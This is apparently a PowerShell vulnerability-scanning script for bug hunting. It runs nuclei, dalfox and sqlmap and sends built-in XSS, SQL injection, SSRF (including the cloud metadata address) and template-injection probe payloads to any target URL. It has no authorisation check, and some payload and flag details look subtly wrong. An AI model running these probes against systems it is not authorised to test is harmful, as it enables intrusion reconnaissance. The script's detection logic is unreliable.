# Bug Hunter - Scan Tool
# Usage: ./scan.ps1 -Target <url> -Type <scan type>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [string]$Type = "all",
    [string]$OutputDir = "./bug-hunter-output"
)

$ErrorActionPreference = "Stop"

Write-Host "[*] Starting vulnerability scan for: $Target" -ForegroundColor Cyan

if (!(Test-Path $OutputDir)) {
    New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
}

$scanResults = "$OutputDir/scan-$((Get-Date).Ticks).txt"

switch ($Type) {
    "all" {
        Write-Host "[*] Running full scan..." -ForegroundColor Yellow
        
        if (Get-Command nuclei -ErrorAction SilentlyContinue) {
            nuclei -u $Target -severity critical,high,medium -silent -o $scanResults
        }
        
        if (Get-Command dalfox -ErrorAction SilentlyContinue) {
            dalfox url $Target -o "$OutputDir/xss.txt"
        }
        
        if (Get-Command sqlmap -ErrorAction SilentlyContinue) {
            sqlmap -u $Target --batch --random-agent -o "$OutputDir/sqli.txt"
        }
    }
    
    "xss" {
        Write-Host "[*] Running XSS scan..." -ForegroundColor Yellow
        
        if (Get-Command dalfox -ErrorAction SilentlyContinue) {
            dalfox url $Target -o "$OutputDir/xss.txt"
        } else {
            # Manual XSS testing
            $xssPayloads = @(
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'-alert(1)-'",
                "\"><script>alert(1)</script>"
            )
            
            foreach ($payload in $xssPayloads) {
                $testUrl = "$Target`?q=$payload"
                $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
                
                if ($response.Content -match $payload) {
                    Write-Host "[!] XSS Found: $payload" -ForegroundColor Red
                    Add-Content $scanResults "XSS: $payload at $Target"
                }
            }
        }
    }
    
    "sqli" {
        Write-Host "[*] Running SQLi scan..." -ForegroundColor Yellow
        
        $sqliPayloads = @(
            "' OR '1'='1",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
            "'; SELECT 1/0--"
        )
        
        foreach ($payload in $sqliPayloads) {
            $testUrl = "$Target`?id=$payload"
            $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
            
            if ($response.Content -match "SQL syntax|mysql|error" -or $response.StatusCode -eq 500) {
                Write-Host "[!] SQLi Found: $payload" -ForegroundColor Red
                Add-Content $scanResults "SQLi: $payload at $Target"
            }
        }
    }
    
    "ssrf" {
        Write-Host "[*] Running SSRF scan..." -ForegroundColor Yellow
        
        $ssrfPayloads = @(
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/",
            "http://2130706433"
        )
        
        foreach ($payload in $ssrfPayloads) {
            $body = "url=$payload"
            $response = Invoke-WebRequest -Uri $Target -Method POST -Body $body -UseBasicParsing -ErrorAction SilentlyContinue
            
            if ($response.Content -match "localhost|127.0.0.1|metadata") {
                Write-Host "[!] SSRF Found: $payload" -ForegroundColor Red
                Add-Content $scanResults "SSRF: $payload at $Target"
            }
        }
    }
    
    "idor" {
        Write-Host "[*] Running IDOR scan..." -ForegroundColor Yellow
        Write-Host "[*] IDOR requires manual testing with two accounts" -ForegroundColor Yellow
        Write-Host "[*] Test: Change IDs in URL/headers/cookies between accounts" -ForegroundColor Yellow
    }
    
    "ssti" {
        Write-Host "[*] Running SSTI scan..." -ForegroundColor Yellow
        
        $sstiPayloads = @(
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "{{7*'7'}}"
        )
        
        foreach ($payload in $sstiPayloads) {
            $testUrl = "$Target`?input=$payload"
            $response = Invoke-WebRequest -Uri $testUrl -UseBasicParsing -ErrorAction SilentlyContinue
            
            if ($response.Content -match "49|7777777") {
                Write-Host "[!] SSTI Found: $payload" -ForegroundColor Red
                Add-Content $scanResults "SSTI: $payload at $Target"
            }
        }
    }
    
    "nuclei" {
        if (Get-Command nuclei -ErrorAction SilentlyContinue) {
            nuclei -u $Target -severity critical,high,medium -silent -o $scanResults
        } else {
            Write-Host "[!] nuclei not found" -ForegroundColor Red
        }
    }
}

Write-Host "[+] Scan complete! Results: $scanResults" -ForegroundColor Green